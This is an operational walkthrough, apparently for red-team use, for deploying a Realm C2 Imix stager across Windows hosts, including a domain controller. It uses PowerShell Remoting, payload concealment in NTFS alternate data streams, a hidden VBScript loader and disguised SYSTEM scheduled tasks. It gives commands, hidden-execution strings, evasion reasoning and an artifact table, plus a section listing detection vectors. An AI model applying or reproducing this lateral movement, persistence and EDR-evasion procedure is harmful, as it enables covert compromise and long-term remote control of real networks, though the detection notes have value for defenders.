🚀 ADS-Drop-System: Usage Walkthrough

The following describes how a penetration tester authorized to use Realm and access the target network would use the ADS-Drop-System, assuming initial command execution (a shell) has already been achieved on an administrative host (e.g., initial exploit, local privilege escalation, or access to an interactive shell).
Prerequisites: Generating the Imix Stager

Before touching the target, you must obtain the required payload from your Realm C2 instance.

    Generate Stager: In your Realm console, generate a new Windows PowerShell Stager for your Imix agent.
    Obfuscate/Encode: Realm will provide a highly obfuscated stager command (e.g., powershell.exe -e <VERY_LONG_STRING>). You must then Base64 encode the entire stager command string one additional time.
        Example Input: powershell.exe -w hidden -e <Realm_Stager_Base64>
        Final $RealmStager Value: The Base64 string of the Example Input string.


Step 1: Initial Injection and Deployment

This step requires a privileged session (Admin or better) into the compromised host, which serves as the launchpad.

    Load the Function: In your PowerShell session on the jump host (or locally, if executing remotely), load the Invoke-LateralDeploySyc function.
    powershell

. .\Invoke-LateralDeploySyc.ps1

Define Stager and Targets: Set your stager and target list, including the local machine if you want the system persistence on the jump host.
powershell

# The Imix Stager string, Base64 encoded:
$ImixStager = "..." # This is the long encoded string from the prerequisite step

# Target list (includes the local host, if desired, and remote hosts)
$TargetHosts = @('LOCAL_HOST_NAME', 'DC01', 'SRV01_WEB')

Execute Deployment: Run the function.
powershell

    Invoke-LateralDeploySyc -TargetHosts $TargetHosts -RealmStager $ImixStager -Verbose

    Deployment Actions (via PowerShell Remoting): The script executes the following remote actions on each target host:
        File Staging: Writes a benign host file (C:\ProgramData\SystemCache.dat) and the VBScript loader (C:\ProgramData\app_log_a.vbs).
            Note on Path: We use C:\ProgramData instead of %APPDATA%\Local\Microsoft\CLR for two reasons: 1) C:\ProgramData is universally accessible by the SYSTEM account (required for Scheduled Tasks), and 2) the path is less likely to be scanned than the AppData folder.
        ADS Concealment: Writes the entire Realm Imix PowerShell stager ($ImixStager) into the Alternate Data Stream: C:\ProgramData\SystemCache.dat:syc_core.
        Persistence 1 (Logon): Creates a Scheduled Task (\Microsoft\Windows\Customer Experience Improvement Program\KernelConsolidator) set to run the VBScript at any user logon, running as SYSTEM for maximum privilege.
        Persistence 2 (Resilience): Creates a Scheduled Task (\Microsoft\Windows\SystemCheck\ProcessMonitor) set to run every 5 minutes and check for the Imix process.


Step 2: Agent Execution (Post-Deployment)

    Immediate Execution: The Invoke-Command session which created the files and tasks concludes. For the beacon to fire immediately, the attacker must initiate the VBScript execution manually for the first time before the first logon or 5-minute interval.
    powershell

    # Run the VBScript once on the remote machine to start the agent
    Invoke-Command -ComputerName DC01 -ScriptBlock { wscript.exe //B "C:\ProgramData\app_log_a.vbs" }

    Agent Action Flow:
        VBScript Runs: wscript.exe executes app_log_a.vbs invisibly.
        ADS Read: The VBScript uses ADODB.Stream to read the content of the ADS stream (SystemCache.dat:syc_core).
        Command Building: The VBScript builds the final execution string: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "<Realm_Imix_Stager>".
        Agent Fires: powershell.exe executes the Realm stager, which initiates the Imix agent C2 connection and performs the in-memory injection of the final agent DLL.


📊 Security Analysis and Trade-Offs

Benefits (Why this is effective)
    Feature	            Evasion Technique
    ADS Concealment	    The actual payload (the Realm stager string) is not in the filesystem where static or basic dynamic scanners look. It's hidden in the $DATA stream attached to a benign file.
    LOLBAS Execution	Uses native Windows binaries (wscript.exe, powershell.exe, schtasks.exe) for execution, avoiding the need to drop suspicious custom executables.
Dual Persistence	Schedule Tasks running as SYSTEM provide the highest level of stability and privilege, and the dual tasks with a 5-minute check ensure automatic self-healing if the agent is terminated.
Stealthy Artifacts	Uses common Microsoft-like file locations (C:\ProgramData) and Microsoft-like task names (KernelConsolidator, ProcessMonitor), blending in with normal system operations.
In-Memory Agent	The final Imix agent never touches the disk, making it far more difficult for Endpoint Detection and Response (EDR) systems to analyze or quarantine based on signatures.
Potential Shortcomings and Detection Vectors
Shortcoming	Possible Detection Method
PowerShell Command-Line Monitoring	Although the agent is in-memory, the initial wscript.exe that spawns powershell.exe with the full stager command is visible in process execution logs (e.g., Sysmon Event ID 1). EDRs that monitor command-line arguments can flag this.
Scheduled Task Creation	Creation of new Scheduled Tasks (KernelConsolidator, ProcessMonitor) is a highly visible event in the Windows Event Log (Event ID 4698). EDR solutions often alert on tasks created by remote users, even if the task names are benign.
Network Traffic	The initial attempt to download the second stage from the Realm C2 server (e.g., via HTTP/S) will be visible to network firewalls and proxy logs.
ADS Scanning	Advanced forensic tools and specialized EDR features can specifically enumerate and scan Alternate Data Streams, though this is less common for routine monitoring.
VBScript Execution	The periodic execution of wscript.exe <VBSCRIPT_PATH> will be a recurring process execution event every 5 minutes, which might flag as suspicious behavior by an ML-based detection system.


🛠️ Artifacts on Target Host

The deployment creates the following artifacts on the target system (typically in C:\ProgramData\):
Component	Path/Name	Purpose	Access Level
Loader	C:\ProgramData\app_log_a.vbs	Reads ADS, launches powershell.exe.	SYSTEM/User
ADS Host	C:\ProgramData\SystemCache.dat	Benign host file (0 bytes).	SYSTEM/User
Payload	C:\ProgramData\SystemCache.dat:syc_core	Contains the Base64-encoded Imix stager.	SYSTEM/User
Persistence 1	\Microsoft\Windows\Customer Experience Improvement Program\KernelConsolidator	Runs C:\ProgramData\app_log_a.vbs on User Logon.	SYSTEM
Persistence 2	\Microsoft\Windows\SystemCheck\ProcessMonitor	Runs every 5 minutes to relaunch the agent if it dies.
